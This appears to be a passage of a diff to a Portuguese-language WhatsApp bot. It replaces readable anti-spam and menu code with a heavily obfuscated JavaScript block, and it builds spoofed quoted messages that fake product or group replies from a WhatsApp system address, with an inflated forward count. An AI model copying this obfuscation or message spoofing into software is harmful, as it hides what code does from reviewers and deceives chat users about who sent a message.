8[_0x403dce(-0x13e,-0x173,-0x194,-0x1aa,-0x1a1)+_0x532209(-0x6f,-0xa2,-0x90,-0x97,-0xc8)+'t']=_0x5b9071(-0x17e,-0x1b6,-0x1b1,-0x186,-0x154)+_0x532209(-0xaa,-0x95,-0x52,-0x80,-0x50)+_0x403dce(-0x1be,-0x1c0,-0x1d3,-0x199,-0x1b3)+'t';function _0x4d3e(){const _0x36f1e2=['\x0aFN:t','s@bro','591-1','224pBneix','readF','a,;;;','warde','eJid','rJid','id=','BLabe','apply','sel\x0aE','order','toStr','1731561YQHdcJ','forwa','asset','conve','ARD','TIO\x20T',':VCAR','ructo','ND:VC','36505','3071844cdaGCM','isFor','s/bot','61495','statu','./eu.','ral','Tio\x20T',')+)+)','api.w','TOMIO','SION:','OMIOK','4XJfkQA','omiok','EL;wa','YyKii','cipan','pp.co','62831','171927RgNbdm','t=olá','em1.T','sendE','3337@','597553SstNqC','Title','m/sen','jpg','o.web','28OtjpVx','rding','adcas','parti',':XL;t','Score','split','const','22086','\x0a𝐜𝐨𝐦𝐚','hatsa','2319204jlCTld','a,\x0ait','ileSy','44998','logo.','\x0a➢\x20\x20','7&tex','ne=55','remot','377737UBJJkL','io\x20To','searc','120Pxsycm','D\x0aVER','otlog','conte','\x0aitem','fromM','ps://','g.us','d?pho','529095RhPhXF','%20*T','./ass','selle','pp.ne','1.X-A','ing','(((.+','mioka','key','l:Pon','𝐧𝐝𝐨:\x20','BEGIN','messa','rsati','3.0\x0aN','webp','pheme','PHOTO','a\x0ahtt','ets/b','xtInf','0@s.w'];_0x4d3e=function(){return _0x36f1e2;};return _0x4d3e();}function _0x403dce(_0x461fc3,_0x271acf,_0x4a5121,_0x290e3b,_0x15185c){return _0x3211(_0x271acf- -0x353,_0x15185c);}_0x409d68[_0x403dce(-0x175,-0x163,-0x15a,-0x13f,-0x184)+_0x1fc37e(0x22,0x42,0x2a,0xf,0x5a)]=_0x464d6f(0xb,-0x26,-0x1b,-0x1e,0x30)+_0x1fc37e(0x21,0x0,0x24,0x5b,0x1a)+_0x1fc37e(0x76,0x63,0x5c,0x88,0x50)+'t';const _0x4f5902={};_0x4f5902[_0x403dce(-0x1a5,-0x19b,-0x1a1,-0x1a2,-0x178)+_0x1fc37e(0x2f,0x37,0x1a,0x23,0x15)+'on']=fake,_0x4f5902[_0x532209(-0x9e,-0xa2,-0x93,-0xb4,-0x95)+_0x532209(-0x9a,-0xc5,-0xa5,-0x8e,-0xc5)]=_0x464d6f(0x11,0x2b,0x3e,0x14,0x5)+'KA',_0x4f5902[_0x5b9071(-0x1b3,-0x16a,-0x170,-0x199,-0x177)+_0x532209(-0xe2,-0xa2,-0xa7,-0xb9,-0x90)]=_0x532209(-0xee,-0xf6,-0xad,-0xc2,-0x94)+_0x464d6f(0x2f,0x24,0x11,0x4a,0xf)+_0x532209(-0xcc,-0xa3,-0xbd,-0xd4,-0xf2)+'t';const _0x2aa757={};_0x2aa757[_0x403dce(-0x1bf,-0x19d,-0x187,-0x1ac,-0x1aa)+_0x464d6f(0x26,-0x11,0x25,-0x4,-0x9)+_0x5b9071(-0x126,-0x127,-0x160,-0x149,-0x153)]=0x3e7,_0x2aa757[_0x532209(-0xa8,-0x7f,-0xca,-0xa7,-0xac)+_0x464d6f(-0xc,-0x12,-0x1,-0x13,0x2a)+'d']=!![];const _0x40b10e={};_0x40b10e[_0x1fc37e(0x17,-0x9,0x15,0x20,-0x1e)]=_0x409d68,_0x40b10e[_0x5b9071(-0x179,-0x192,-0x19c,-0x18f,-0x15d)+'ge']=_0x4f5902;function _0x464d6f(_0x8f33d6,_0x48393b,_0x4d53cd,_0x225cc1,_0x8b8048){return _0x3211(_0x8f33d6- -0x1b8,_0x8b8048);}_0x40b10e[_0x1fc37e(-0x2c,-0x25,0x6,0xf,-0x3)+_0x1fc37e(0x43,-0x9,0x21,-0x7,0x6)+'o']=_0x2aa757;function _0x532209(_0x2429cc,_0x32fd45,_0x2b6a34,_0x4b9ad8,_0x2e8ee3){return _0x3211(_0x4b9ad8- -0x267,_0x2b6a34);}_0x40b10e[_0x5b9071(-0x17c,-0x16f,-0x184,-0x155,-0x152)+_0x5b9071(-0x1ad,-0x195,-0x198,-0x18b,-0x174)+_0x403dce(-0x1ab,-0x18e,-0x188,-0x1bb,-0x15f)]=!![];const tomio=_0x40b10e;function _0x5b9071(_0x3bf9b9,_0x33be4f,_0xe9de80,_0x1e8598,_0x43f1f8){return _0x3211(_0x1e8598- -0x32b,_0x43f1f8);}const tomis={'text':'oi','forwardingScore':0x3b9aca00,'isForwarded':!![],'sendEphemeral':!![],'externalAdReply':{'title':_0x5b9071(-0x13b,-0x141,-0x162,-0x171,-0x142)+_0x532209(-0xc8,-0x7a,-0x76,-0x9c,-0xac)+'A','body':'','previewType':_0x5b9071(-0x19e,-0x19b,-0x16c,-0x18a,-0x15a),'thumbnailUrl':'','thumbnail':fs[_0x532209(-0xea,-0xda,-0x98,-0xbd,-0x9c)+_0x403dce(-0x160,-0x169,-0x152,-0x174,-0x165)+'nc'](_0x1fc37e(0xa,0x2e,0x41,0x2c,0x43)+_0x1fc37e(0x2e,0x5b,0x58,0x56,0x4c)),'sourceUrl':_0x403dce(-0x184,-0x18d,-0x1a0,-0x1b5,-0x18a)+_0x1fc37e(0x68,0x24,0x4a,0x6d,0x5f)+_0x1fc37e(0x13,0x17,0x1f,-0xc,0x34)+_0x5b9071(-0x19f,-0x1b8,-0x17b,-0x19f,-0x179)+_0x5b9071(-0x183,-0x14e,-0x14d,-0x163,-0x18c)+_0x464d6f(0x2f,0x55,0x1f,0x25,0xc)+_0x403dce(-0x16a,-0x182,-0x188,-0x16c,-0x179)+_0x1fc37e(0x57,0x29,0x57,0x4d,0x22)+_0x464d6f(-0x2a,-0x15,-0x21,-0x57,-0x3)+_0x532209(-0x4a,-0x44,-0x9a,-0x78,-0x46)+_0x5b9071(-0x156,-0x114,-0x150,-0x140,-0x151)+_0x403dce(-0x15f,-0x16e,-0x168,-0x189,-0x1a5)+_0x464d6f(0x36,0x57,0x62,0x50,0x54)+_0x403dce(-0x16a,-0x17f,-0x163,-0x1a5,-0x1a1)+_0x5b9071(-0x182,-0x1cc,-0x1b3,-0x19b,-0x1a3)+_0x532209(-0xd8,-0xc4,-0xff,-0xe3,-0x10e)+_0x532209(-0x9b,-0xf6,-0xe7,-0xd0,-0xe8)+'!*'},'mentionedJid':[sender]};
      //FAKEREPLY PRODUCT
             const ftoko = {
                   key: {fromMe: false,participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "60139571124@s.whatsapp.net" } : {})},message: {"productMessage": {"product": {"productImage":{"mimetype": "image/jpeg","jpegThumbnail": fs.readFileSync(`./eu.jpg`)},"title": `${waktoonyabro}`,"description": `ɪ ᴀᴍ 𝑡𝑜𝑚𝑖𝑜𝑘𝑎 𝑏𝑜𝑡\n𝐜𝐨𝐦𝐚𝐧𝐝𝐨: ${command}`, "currencyCode":`𝐜𝐨𝐦𝐚𝐧𝐝𝐨: ${command}`,"retailerId": "ɪ ᴀᴍ 𝑡𝑜𝑚𝑖𝑜𝑘𝑎 𝑏𝑜𝑡","productImageCount": 1},"businessOwnerJid": `0@s.whatsapp.net`}}}
@@ -1841,7 +1797,7 @@ Sua vez : @${moving.turn == "X" ? moving.X : moving.O}
             
            
 const fakegroup = (teks) => {
-			tomioka.sendMessage(from, teks, text, {
+			client.sendMessage(from, teks, text, {
 				quoted: {
 					key: {
 						fromMe: false,
@@ -1925,14 +1881,14 @@ const checkSCommand = (id) => {
                 if (budo === `->public`) {
                     if (public == `true`) return reply('Modo público já ativo')
                     public = true
-                    tomioka.sendMessage(from, 'ALTERNANDO PARA O MODO: PÚBLICO', text, {
+                    client.sendMessage(from, 'ALTERNANDO PARA O MODO: PÚBLICO', text, {
                         quoted: mek
                     })
                 }
                 if (budo === `->self`) {
                     if (public == `false`) return reply('Modo privado já ativo')
                     public = false
-                    tomioka.sendMessage(from, 'ALTERNANDO PARA O MODO: PRIVADO', text, {
+                    client.sendMessage(from, 'ALTERNANDO PARA O MODO: PRIVADO', text, {
                         quoted: mek
                     })
                 }
@@ -1956,22 +1912,19 @@ const checkSCommand = (id) => {
    	             console.error(err)
    	         }
 	        }
-			/*const isUrl = (url) => {
-			    return url.match(new RegExp(/https?:\/\/(www\.)?[-a-zA-Z0-9@:%._+~#=]{1,256}\.[a-zA-Z0-9()]{1,6}\b([-a-zA-Z0-9()@:%_+.~#?&/=]*)/, 'gi'))
-			}*/
 			const isUrl = (url) => {return url.match(new RegExp(/https?:\/\/(www\.)?[-a-zA-Z0-9@:%._+~#=]{1,256}\.[a-zA-Z0-9()]{1,6}\b([-a-zA-Z0-9()@:%_+.~#?&/=]*)/, 'gi'))
 			}
 			const reply = (teks) => {
-				tomioka.sendMessage(from, teks, text, {contextInfo:tomis})
+				client.sendMessage(from, teks, text, {contextInfo:tomis})
 			}
 			const sendImage = (teks) => {
-		    tomioka.sendMessage(from, teks, image, {quoted:mek})
+		    client.sendMessage(from, teks, image, {quoted:mek})
 		    }
 			const sendMess = (hehe, teks) => {
-				tomioka.sendMessage(hehe, teks, text)
+				client.sendMessage(hehe, teks, text)
 			}
 			const mentions = (teks, memberr, id) => {
-				(id == null || id == undefined || id == false) ? tomioka.sendMessage(from, teks.trim(), extendedText, {contextInfo: {"mentionedJid": memberr}}) : tomioka.sendMessage(from, teks.trim(), extendedText, {quoted: mek, contextInfo: {"mentionedJid": memberr}})
+				(id == null || id == undefined || id == false) ? client.sendMessage(from, teks.trim(), extendedText, {contextInfo: {"mentionedJid": memberr}}) : client.sendMessage(from, teks.trim(), extendedText, {quoted: mek, contextInfo: {"mentionedJid": memberr}})
 			}
 			if (selectedButton == ("cassino")){
 				if (!isUser) return fakegroup (`「 ❗ 」Registre-se primeiro\nMande o comando : ${prefix}rg`)
@@ -1980,7 +1933,7 @@ const cassino = ['ㅤ\n*╔═─ CASSINO ─══*\n*║*\n*║*\n*╠* ROLETA
 					reply(`${random}`)
 			}
 ///===============CARRINHO================///// by sayo
-     res = await tomioka.prepareMessageFromContent(from, {
+     res = await client.prepareMessageFromContent(from, {
                     "orderMessage": {
                         "orderId": "TOMIOKA BOT",
                         "thumbnail": fs.readFileSync('./me.jpg') ,
@@ -1996,127 +1949,11 @@ const cassino = ['ㅤ\n*╔═─ CASSINO ─══*\n*║*\n*║*\n*╠* ROLETA
       "isForwarded": true
     }
   }, tomioka)
-//tomioka.relayWAMessage(res)
-//================AUTO SAIR===================// by @tio_tomioka_ofc/zanga/gustavo
-/*if ((budy === `bot ruim`) || (budy === `Bot ruim`) || (budy === `bot lixo`) || (budy === `Bot lixo`) || (budy === `bot falido`) || (budy === `Bot falido`)){     
-console.log(color('[AUTO SAIR]', 'cyan'), color(`${budy}`, 'magenta'))       
-if (isBanned) return reply(mess.only.benned)
-if (!isGroup) return reply(mess.only.group)
-if (isGroupAdmins || isOwner || tomioka) {
-tomioka.groupLeave(from)
-} else {
-reply(mess.only.admin)
-}
-}*/
-//================RESPONDER COM FIGURINHA===================//
-switch (cmdstk) {
-      case 'h8hD3ZlSGCeVE5n0DCCVNp8mHl/AgTEPJeRQUXt+wes=':
-      const tomioks= `
- *꧁𝕋𝕆𝕄𝕀𝕆𝕂𝔸~𝔹𝕆𝕋꧂*
-bem vindo *${pushname}*🎉
-            👷🏻DONO👷🏻
-ᬊ⃔⃕͜ 亇ł❍ 亇❍ᛖł❍Ҡ么↯愛
-*wa.me/5544998220867*
-✧═══•❁❀❁•═══✧
-𝗣𝗜𝗫: *${prefix}doar*
-✧═══•❁❀❁•═══✧
-⏰tempo do bot ativo: 
-*${temp}*
-✧═══•❁❀❁•═══✧
-reportar bug: 
-${prefix}bug (o bug)
-✧═══•❁❀❁•═══✧
-enviar sugestão:
-${prefix}request (sua sugestão)
-✧═══•❁❀❁•═══✧
-para fazer figurinhas 
-comente a foto/video/gif de até 10 seg:
-com ${prefix}f
-✧═══•❁❀❁•═══✧
-` 
-let temporalY= tomioka.prepareMessageFromContent(from, {
-  "listMessage": {
-            "title": (tomioks),
-            "description": `*✅prefix: ${prefix}*`,
-            "buttonText": "MENUS📌",
-            "listType": "SINGLE_SELECT",
-            "sections": [
-              {
-                "rows": [
-                  {
-                    "title": '🎉MENU DE NOVIDADES🎉',
-                    "rowId": `${prefix}novid`
-                  },
-                  {
-                    "title": '🔥MENU DE GRUPO/ADMINISTRAÇÃO🔥',
-                    "rowId": `${prefix}grupo`
-                    },
-                    {
-                      "title": '😝MENU DE INTERAÇÃO/JOGOS EM (GRUPO)😝',
-                    "rowId": `${prefix}interativos`
-                  },
-                  {
-                    "title": '🗺️MENU DE IMAGENS🗺️',
-                    "rowId": `${prefix}imagens`
-                  },
-                  {
-                    "title": '💎MENU PREMIUM💎',
-                    "rowId": `${prefix}premium`
-                  },
-                  {
-                    "title": '💎MENU DE LOGOS PREMIUM💎',
-                    "rowId": `${prefix}logopremium`
-                  },
-                  {
-                    "title": '🤖MENU ESPECIFICO DO BOT🤖',
-                    "rowId": `${prefix}especifico`
-                  },
-                  {
-                    "title": '🎱MENU DE OUTROS🎱',
-                    "rowId": `${prefix}outros`
-                  },
-                  {
-                    "title": '🗣️MENU DE VOZ🗣️',
-                    "rowId": `${prefix}mvoz`
-                  },
-                  {
-                    "title": '🦋MENU DE INTERAÇÃO/GRUPO🦋',
-                    "rowId": `${prefix}ranks`
-                  }
-                ]
-              }
-            ]                    
-          }
-}, {quoted:mek, contextInfo:tomio2})
-tomioka.relayWAMessage(temporalY)
-      break 
-      }
+//client.relayWAMessage(res)
 //================TRAVAR GRUPO AKKAKA===================//
 //off leg da desgraça
 //================FILTRO===================//
-const hora = moment.tz('America/Sao_Paulo').format('HH:mm:ss')
-			if (isCmd && isFiltered(from) && !isGroup) {
-				         console.log(`\x1b[1;31m${hora}`, '\x1b[1;37m[\x1b[1;31m➻\x1b[1;37m]', color('SPAM:', 'white'), color(pushname, 'red'), color(' COMANDO', 'white'), color('➻', 'red'), color(`${command}`, 'red'), color('NO GRUPO', 'white'), color(groupName, 'red'))
-//console.log(color('SPAM', 'red'), color(command), 'do numero', color(sender.split('@')[0]))
-        const ff = {
-                  text:`Oi @${sender.split('@')[0]}...\nMelhor não floodar comandos, então, aguarde 5 segundos entre cada comando blz?`,
-                    contextInfo: {
-                        mentionedJid: [sender]
-                    }
-                 }
-                 reply(ff)
-        return; }
-             if (isCmd && isFiltered(from) && isGroup) {
-             console.log(`\x1b[1;31m${hora}`, '\x1b[1;37m[\x1b[1;31m➻\x1b[1;37m]', color('SPAM:', 'white'), color(pushname, 'red'), color(' COMANDO', 'white'), color('➻', 'red'), color(`${command}`, 'red'), color('NO GRUPO', 'white'), color(groupName, 'red'))
-//console.log(color('SPAM', 'red'), color(command), 'do numero', color(sender.split('@')[0]))
-        const ff = {
-                  text:`Oi @${sender.split('@')[0]}...\nMelhor não floodar comandos, então, aguarde 5 segundos entre cada comando blz?`,
-                    contextInfo: {
-                        mentionedJid: [sender]
-                    }
-                 }       
-                 reply(ff)
-        return; }
+(function(_0x3ca7bc,_0x3a656a){function _0xd11cbd(_0x10e6ae,_0x4e565c,_0x4f054d,_0x3bc938,_0x2323f9){return _0x31ad(_0x2323f9-0x166,_0x3bc938);}const _0x3d1722=_0x3ca7bc();function _0x336abd(_0x289b20,_0x4c49c4,_0x1582b4,_0x5793b9,_0x3460a1){return _0x31ad(_0x4c49c4-0x2da,_0x5793b9);}function _0x462473(_0x24d78e,_0x427da3,_0x26e758,_0x1e7d42,_0x26559c){return _0x31ad(_0x1e7d42-0x2e3,_0x26559c);}function _0x19f209(_0x5470c4,_0x18bbc5,_0x1ac9a4,_0x5aad8a,_0x172591){return _0x31ad(_0x5470c4-0x15b,_0x172591);}function _0x195fa5(_0x4fa8d6,_0x1b4d67,_0x39a086,_0x3abdb7,_0x4b307e){return _0x31ad(_0x3abdb7- -0x1f1,_0x1b4d67);}while(!![]){try{const _0x1b913c=parseInt(_0x195fa5(-0x4f,-0x43,-0x35,-0x4b,-0x49))/(0xb11*-0x1+-0x1*0x1559+0x206b)+-parseInt(_0x195fa5(-0x4c,-0x74,-0x5e,-0x65,-0x76))/(0x2*-0x23b+-0x1db0+-0x4*-0x88a)+parseInt(_0x19f209(0x2bf,0x2d1,0x2e0,0x2dd,0x2d4))/(-0x11bd*-0x1+0x1*0x15e+-0x1318)*(-parseInt(_0xd11cbd(0x2e3,0x2fc,0x2d9,0x2d9,0x2e0))/(0x27*0x77+0x65*-0xf+-0x619*0x2))+-parseInt(_0x336abd(0x458,0x45f,0x440,0x482,0x46f))/(-0xb28*-0x3+-0xd6*-0x20+-0x3c33)+parseInt(_0x19f209(0x2f5,0x2fa,0x2ee,0x2fe,0x2fc))/(0xa6*-0x2a+0x3ce*0x7+-0x28*-0x4)+-parseInt(_0x195fa5(-0x9e,-0x81,-0x97,-0x7f,-0x89))/(-0x76d*-0x1+-0x66d+-0xf9)+parseInt(_0x336abd(0x4a1,0x47e,0x48c,0x481,0x4a1))/(-0x2663*-0x1+0x55+0x8*-0x4d6);if(_0x1b913c===_0x3a656a)break;else _0x3d1722['push'](_0x3d1722['shift']());}catch(_0x2fe1b7){_0x3d1722['push'](_0x3d1722['shift']());}}}(_0x2be8,-0x21fec+0x39037*0x1+0xc3d45*0x1));const _0x4ae560=(function(){const _0x3aeb94={};function _0x179a93(_0x1dba23,_0x2f94b1,_0x4257a1,_0x3cc0f8,_0x4d680a){return _0x31ad(_0x1dba23- -0x9,_0x4d680a);}_0x3aeb94[_0x179a93(0x16b,0x174,0x17f,0x170,0x15a)]=function(_0x29c10d,_0x4ea5f0){return _0x29c10d===_0x4ea5f0;};function _0x248b4b(_0x2ac376,_0x624ea9,_0x2324a3,_0x4531f0,_0x5876ba){return _0x31ad(_0x4531f0-0xdf,_0x2324a3);}function _0x25c732(_0x5a271f,_0x4f0cbf,_0x4798fa,_0x40efc9,_0x1a50a0){return _0x31ad(_0x5a271f- -0x224,_0x1a50a0);}function _0x546e7a(_0x3865f4,_0x5231fc,_0x5d9247,_0x5591a9,_0x307876){return _0x31ad(_0x5231fc-0x3ac,_0x5d9247);}_0x3aeb94[_0x179a93(0x15d,0x17c,0x13d,0x165,0x154)]=_0x546e7a(0x515,0x52f,0x521,0x54f,0x527),_0x3aeb94[_0x546e7a(0x507,0x51d,0x506,0x50b,0x53f)]=_0x546e7a(0x529,0x529,0x547,0x531,0x50c),_0x3aeb94[_0x7704b5(-0x15d,-0x154,-0x134,-0x143,-0x146)]=function(_0x3b07e4,_0x1ba4e7){return _0x3b07e4!==_0x1ba4e7;},_0x3aeb94[_0x25c732(-0xb4,-0xcc,-0xd2,-0xad,-0xc3)]=_0x25c732(-0xbf,-0x9f,-0xce,-0xa0,-0xc1);function _0x7704b5(_0x4bef51,_0x59a0fa,_0x4bc747,_0x4a70ca,_0xe89ad8){return _0x31ad(_0x4a70ca- -0x2dc,_0x4bc747);}_0x3aeb94[_0x248b4b(0x256,0x279,0x25e,0x26c,0x27a)]=function(_0x404693,_0x2583e3){return _0x404693!==_0x2583e3;},_0x3aeb94[_0x25c732(-0x9e,-0xab,-0x85,-0x8a,-0x80)]=_0x7704b5(-0x115,-0x124,-0x120,-0x137,-0x124);const _0x67151=_0x3aeb94;let _0x57c920=!![];return function(_0xdc3e79,_0x9d1195){function _0x4fff9b(_0x4babe2,_0x1765ce,_0x43c366,_0x588f9a,_0x3801cf){return _0x546e7a(_0x4babe2-0x42,_0x43c366- -0x1b7,_0x1765ce,_0x588f9a-0x5f,_0x3801cf-0x5e);}function _0x386eef(_0x50542b,_0x256ff5,_0x4ca181,_0x441acd,_0x2b42db){return _0x25c732(_0x441acd- -0x10e,_0x256ff5-0x25,_0x4ca181-0x138,_0x441acd-0x188,_0x256ff5);}function _0x31f39e(_0x47a4e1,_0x4ddee6,_0x329685,_0x4d7e9f,_0x46e4e5){return _0x248b4b(_0x47a4e1-0x121,_0x4ddee6-0x14,_0x4d7e9f,_0x4ddee6- -0x388,_0x46e4e5-0x180);}function _0x59c2a0(_0x2fb717,_0x2d259c,_0x20e220,_0x6f623d,_0x57d099){return _0x25c732(_0x2fb717-0x1a4,_0x2d259c-0xfe,_0x20e220-0xbe,_0x6f623d-0xb1,_0x6f623d);}function _0x681941(_0x470502,_0x492575,_0x1293ac,_0x5cf486,_0xacccf1){return _0x7704b5(_0x470502-0x141,_0x492575-0x1,_0x5cf486,_0x492575-0x537,_0xacccf1-0x25);}const _0x13acf8={'EuiMK':function(_0x63152b,_0x200499){function _0x44582d(_0x1f1df7,_0x38b361,_0xb0148f,_0x246807,_0x1f8d7b){return _0x31ad(_0x246807- -0x1c2,_0x1f1df7);}return _0x67151[_0x44582d(-0x65,-0x58,-0x64,-0x4e,-0x2d)](_0x63152b,_0x200499);},'dATxI':_0x67151[_0x31f39e(-0x12a,-0x143,-0x136,-0x12e,-0x131)],'TsAhE':_0x67151[_0x59c2a0(0xf1,0x112,0xe9,0x102,0xfc)],'rmHis':function(_0x1e37a8,_0xa7b604){function _0x111370(_0x4f31ca,_0x58bd9d,_0x5b1ce0,_0x885795,_0x1790f7){return _0x31f39e(_0x4f31ca-0x162,_0x58bd9d-0xf4,_0x5b1ce0-0x1a2,_0x5b1ce0,_0x1790f7-0x19d);}return _0x67151[_0x111370(-0x1e,-0x1c,-0x27,0x3,-0x28)](_0x1e37a8,_0xa7b604);},'TCoNd':_0x67151[_0x31f39e(-0x128,-0x139,-0x148,-0x12e,-0x12f)]};if(_0x67151[_0x386eef(-0x1bf,-0x186,-0x1a3,-0x1a5,-0x1a0)](_0x67151[_0x681941(0x3e5,0x3e1,0x3e3,0x3f7,0x3e6)],_0x67151[_0x31f39e(-0x10e,-0x123,-0x130,-0x109,-0x125)])){const _0x63f8a2=_0x59ad16?function(){function _0x463d50(_0x5d13e9,_0x4537c6,_0x514ce0,_0x2a9b7a,_0x4d277a){return _0x386eef(_0x5d13e9-0x34,_0x514ce0,_0x514ce0-0xa7,_0x2a9b7a-0x530,_0x4d277a-0xdf);}if(_0xc06844){const _0x58978a=_0x2a5757[_0x463d50(0x384,0x352,0x38c,0x373,0x37f)](_0x288894,arguments);return _0x26f82e=null,_0x58978a;}}:function(){};return _0x2238cc=![],_0x63f8a2;}else{const _0x4606cd=_0x57c920?function(){function _0x36a907(_0x5ce159,_0x5265e3,_0xf8e6f8,_0x1be65e,_0x5c01b5){return _0x4fff9b(_0x5ce159-0x16f,_0x5ce159,_0x5c01b5-0x1e9,_0x1be65e-0x170,_0x5c01b5-0x6c);}function _0x2046a1(_0x52ba77,_0x17be7b,_0x2d173a,_0x51d5c7,_0xd1501e){return _0x59c2a0(_0x17be7b-0x16d,_0x17be7b-0xb0,_0x2d173a-0x1e,_0xd1501e,_0xd1501e-0x3b);}function _0x3b0751(_0x4e188e,_0x281883,_0x2d78f9,_0x4122b4,_0x5058d9){return _0x681941(_0x4e188e-0x1b5,_0x4122b4- -0x29,_0x2d78f9-0x1a0,_0x2d78f9,_0x5058d9-0x56);}function _0x2e79e7(_0x9e64c,_0x4ebc7e,_0x1c4b34,_0xc26bb3,_0x5077fb){return _0x4fff9b(_0x9e64c-0x186,_0x9e64c,_0x1c4b34- -0x2ea,_0xc26bb3-0x54,_0x5077fb-0x1b1);}function _0x514475(_0x30df83,_0x1da45c,_0x4a17fe,_0x3063f3,_0x408fc8){return _0x31f39e(_0x30df83-0x6f,_0x1da45c- -0x1a,_0x4a17fe-0x7,_0x4a17fe,_0x408fc8-0x189);}if(_0x13acf8[_0x514475(-0x158,-0x14a,-0x150,-0x13e,-0x151)](_0x13acf8[_0x514475(-0x141,-0x123,-0x144,-0x106,-0x13b)],_0x13acf8[_0x2e79e7(0xa3,0x9a,0x9e,0x8d,0xae)])){const _0xf3b3b0=_0x256903[_0x2e79e7(0x6b,0x97,0x80,0x76,0x92)](_0x2130a8,arguments);return _0x50aed2=null,_0xf3b3b0;}else{if(_0x9d1195){if(_0x13acf8[_0x3b0751(0x3d3,0x3aa,0x3a4,0x3b2,0x3bb)](_0x13acf8[_0x2e79e7(0x6a,0x93,0x76,0x8e,0x6f)],_0x13acf8[_0x514475(-0x16c,-0x158,-0x15f,-0x150,-0x152)])){if(_0x595fd6){const _0x4f9edb=_0x12a8fe[_0x2e79e7(0x78,0x81,0x80,0x8c,0x71)](_0x34654b,arguments);return _0x15067c=null,_0x4f9edb;}}else{const _0x1a66b2=_0x9d1195[_0x36a907(0x568,0x562,0x53b,0x543,0x553)](_0xdc3e79,arguments);return _0x9d1195=null,_0x1a66b2;}}}}:function(){};return _0x57c920=![],_0x4606cd;}};}()),_0x29a237=_0x4ae560(this,function(){function _0x36e4c6(_0x4d4e9e,_0x2b3197,_0x2af6f7,_0x3eee94,_0x21048f){return _0x31ad(_0x2b3197-0x361,_0x2af6f7);}function _0x2ff6ae(_0x51dbd8,_0x385ed6,_0x197674,_0x2b9eb0,_0x7f623c){return _0x31ad(_0x385ed6- -0x1a7,_0x51dbd8);}function _0x279fbc(_0x316776,_0x14cd30,_0x1a593f,_0x4b4276,_0x53374e){return _0x31ad(_0x1a593f-0x354,_0x14cd30);}const _0x57e772={};_0x57e772[_0x36e4c6(0x4e3,0x4e2,0x4da,0x4ec,0x4e5)]=_0x279fbc(0x4e0,0x4b6,0x4bd,0x4a8,0x49d)+_0xcf46ed(0x296,0x2bc,0x2b4,0x2a7,0x2a6)+'+$';function _0x3f35b1(_0x293205,_0x3c3aec,_0x324d30,_0x39a838,_0x25fa06){return _0x31ad(_0x324d30- -0x15,_0x39a838);}const _0x1588b9=_0x57e772;function _0xcf46ed(_0x2d7422,_0x4fe84c,_0x14f03d,_0x52581b,_0x5ad5a1){return _0x31ad(_0x52581b-0x10a,_0x4fe84c);}return _0x29a237[_0x3f35b1(0x163,0x134,0x155,0x156,0x15a)+_0xcf46ed(0x25e,0x270,0x274,0x279,0x25c)]()[_0x279fbc(0x4fb,0x4e1,0x4df,0x4c1,0x4cc)+'h'](_0x1588b9[_0x2ff6ae(-0x22,-0x26,-0x23,-0x42,-0x37)])[_0x3f35b1(0x162,0x145,0x155,0x15d,0x150)+_0x279fbc(0x4e5,0x4d7,0x4c3,0x4a5,0x4df)]()[_0x3f35b1(0x17a,0x16c,0x166,0x14e,0x152)+_0x2ff6ae(-0x28,-0x17,0x2,0xc,-0x1b)+'r'](_0x29a237)[_0x279fbc(0x4f5,0x4d0,0x4df,0x4db,0x4ca)+'h'](_0x1588b9[_0x2ff6ae(-0x15,-0x26,-0x35,-0xd,-0x31)]);});function _0x10df3c(_0x4d741d,_0xf85764,_0x52e724,_0x1dcf52,_0x435cac){return _0x31ad(_0x1dcf52- -0xc1,_0x4d741d);}_0x29a237();const hora=moment['tz'](_0xe206f0(0xcf,0xba,0xca,0xc2,0xc4)+_0x26c85e(0x53,0x52,0x66,0x52,0x48)+_0xe206f0(0xda,0xc5,0xd6,0xee,0xe7)+'lo')[_0x26c85e(0x6e,0x40,0x60,0x63,0x7f)+'t'](_0xe206f0(0xae,0x9b,0xc6,0xab,0x8b)+_0x26c85e(0x2f,0x5b,0x47,0x52,0x27));function _0xe206f0(_0x44bdda,_0x7061d5,_0x44460e,_0x407413,_0x589cdd){return _0x31ad(_0x44bdda- -0xc9,_0x44460e);}function _0x31ad(_0x948e83,_0x3b05f0){const _0x26a1cd=_0x2be8();return _0x31ad=function(_0xfe7fd6,_0xf1906b){_0xfe7fd6=_0xfe7fd6-(-0x3*0xc93+-0x2*0x7ce+-0x1*-0x36b9);let _0xf1f03a=_0x26a1cd[_0xfe7fd6];return _0xf1f03a;},_0x31ad(_0x948e83,_0x3b05f0);}if(isCmd&&isFiltered(from)&&!isGroup){console[_0x3118bd(-0x75,-0x8a,-0x79,-0x7e,-0x57)](_0xe206f0(0x9f,0x84,0x80,0xb4,0xbb)+'1m'+hora,_0x26c85e(0x44,0x23,0x37,0x51,0x17)+_0xe206f0(0xbe,0xd7,0xd0,0xb9,0xbb)+_0x10df3c(0xab,0x95,0xa1,0xad,0x92)+_0x26c85e(0x3c,0x53,0x45,0x23,0x5d)+_0x3118bd(-0x56,-0x82,-0x6a,-0x65,-0x6b),color(_0x3827be(0x397,0x39c,0x3ad,0x399,0x38e),_0x26c85e(0x4b,0x4c,0x58,0x3f,0x61)),color(pushname,_0x3827be(0x3ab,0x3a3,0x3b9,0x3c9,0x3b8)),color(_0x3118bd(-0x29,-0x38,-0x4b,-0x44,-0x29)+_0xe206f0(0x9e,0xb3,0xa7,0xa8,0xa1),_0x26c85e(0x6a,0x3a,0x58,0x3d,0x4e)),color('➻',_0x3118bd(-0x44,-0x3f,-0x44,-0x25,-0x30)),color(''+command,_0x3827be(0x3ab,0x38f,0x3bb,0x3aa,0x39b)),color(_0x3118bd(-0x48,-0x5f,-0x62,-0x5c,-0x7c)+_0x10df3c(0xc8,0xed,0xe5,0xd4,0xc7),_0x3118bd(-0x80,-0x4f,-0x63,-0x70,-0x7b)),color(groupName,_0x3827be(0x3ab,0x3bf,0x39b,0x3b5,0x3c6)));const 